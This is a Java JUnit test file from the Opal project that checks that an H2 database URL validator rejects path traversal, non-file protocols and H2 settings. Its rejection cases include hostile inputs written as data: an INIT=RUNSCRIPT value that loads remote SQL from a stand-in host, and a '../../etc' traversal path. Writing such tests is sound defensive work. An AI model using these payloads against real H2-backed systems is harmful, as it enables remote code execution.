/*
 * Copyright (c) 2021 OBiBa. All rights reserved.
 *
 * This program and the accompanying materials
 * are made available under the terms of the GNU Public License v3.0.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.obiba.opal.core.runtime.jdbc;

import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TemporaryFolder;
import org.obiba.opal.core.service.database.InvalidH2DatabaseException;

import java.io.File;
import java.io.IOException;

import static org.fest.assertions.api.Assertions.assertThat;
import static org.fest.assertions.api.Assertions.fail;

public class H2DatabaseUrlsTest {

  @Rule
  public TemporaryFolder temporaryFolder = new TemporaryFolder();

  @Test
  public void test_is_h2() {
    assertThat(H2DatabaseUrls.isH2("org.h2.Driver")).isTrue();
    assertThat(H2DatabaseUrls.isH2("org.postgresql.Driver")).isFalse();
    assertThat(H2DatabaseUrls.isH2(null)).isFalse();
  }

  @Test
  public void test_database_name() {
    assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:opal")).isEqualTo("opal");
    assertThat(H2DatabaseUrls.getDatabaseName("jdbc:h2:file:my-db_1.0")).isEqualTo("my-db_1.0");
  }

  @Test
  public void test_database_name_must_be_a_plain_name() {
    // a name is the only thing that can be expressed, so there is no path to escape from
    assertRejected("jdbc:h2:file:../../etc/opal");
    assertRejected("jdbc:h2:file:/var/lib/opal");
    assertRejected("jdbc:h2:file:sub/opal");
    assertRejected("jdbc:h2:file:sub\\opal");
    assertRejected("jdbc:h2:file:.opal");
    assertRejected("jdbc:h2:file:");
  }

  @Test
  public void test_h2_settings_are_not_accepted() {
    // a setting is not a tuning knob but a second language: INIT alone runs arbitrary SQL when the connection opens
    assertRejected("jdbc:h2:file:opal;DB_CLOSE_DELAY=-1");
    assertRejected("jdbc:h2:file:opal;INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
    assertRejected("jdbc:h2:file:;DB_CLOSE_DELAY=-1");
  }

  @Test
  public void test_init_connection_property_is_rejected() {
    assertPropertiesRejected("INIT=RUNSCRIPT FROM 'https://elsewhere.example/payload.sql'");
    assertPropertiesRejected("MODE=PostgreSQL;init=CREATE SCHEMA S");
    assertPropertiesRejected(" Init = SELECT 1 ");
  }

  @Test
  public void test_properties_without_an_init_setting_are_accepted() {
    H2DatabaseUrls.validateProperties(null);
    H2DatabaseUrls.validateProperties("");
    H2DatabaseUrls.validateProperties("MODE=PostgreSQL;DB_CLOSE_DELAY=-1");
    // a value that merely mentions the setting is not one
    H2DatabaseUrls.validateProperties("MODE=INIT");
  }

  @Test
  public void test_only_file_urls_are_accepted() {
    assertRejected("jdbc:h2:mem:opal");
    assertRejected("jdbc:h2:tcp://localhost:9092/opal");
    assertRejected("jdbc:h2:ssl://localhost:9092/opal");
    assertRejected("jdbc:h2:zip:~/db.zip!/opal");
    assertRejected("jdbc:h2:/var/lib/opal");
    assertRejected("jdbc:postgresql://localhost:5432/opal");
    assertRejected(null);
  }

  @Test
  public void test_expand() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(H2DatabaseUrls.expand("jdbc:h2:file:opal", root))
        .isEqualTo("jdbc:h2:file:" + new File(root, "opal").getAbsolutePath());
  }

  @Test
  public void test_expand_creates_the_h2_folder() {
    File root = new File(temporaryFolder.getRoot(), "data/h2");
    assertThat(root.exists()).isFalse();
    H2DatabaseUrls.expand("jdbc:h2:file:opal", root);
    assertThat(root.isDirectory()).isTrue();
  }

  @Test
  public void test_validate_rejects_a_legacy_database() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(new File(root, "opal.h2.db").createNewFile()).isTrue();
    assertRejected("jdbc:h2:file:opal", root);
  }

  @Test
  public void test_validate_accepts_a_migrated_database() throws IOException {
    File root = temporaryFolder.newFolder("h2");
    assertThat(new File(root, "opal.h2.db").createNewFile()).isTrue();
    assertThat(new File(root, "opal.mv.db").createNewFile()).isTrue();
    H2DatabaseUrls.validate("jdbc:h2:file:opal", root);
  }

  @Test
  public void test_validate_accepts_a_new_database() throws IOException {
    H2DatabaseUrls.validate("jdbc:h2:file:opal", temporaryFolder.newFolder("h2"));
  }

  private void assertPropertiesRejected(String properties) {
    try {
      H2DatabaseUrls.validateProperties(properties);
      fail("Expected an InvalidH2DatabaseException for properties: " + properties);
    } catch(InvalidH2DatabaseException ignored) {
    }
  }

  private void assertRejected(String url) {
    assertRejected(url, temporaryFolder.getRoot());
  }

  private void assertRejected(String url, File root) {
    try {
      H2DatabaseUrls.validate(url, root);
      fail("Expected an InvalidH2DatabaseException for URL: " + url);
    } catch(InvalidH2DatabaseException ignored) {
    }
  }
}
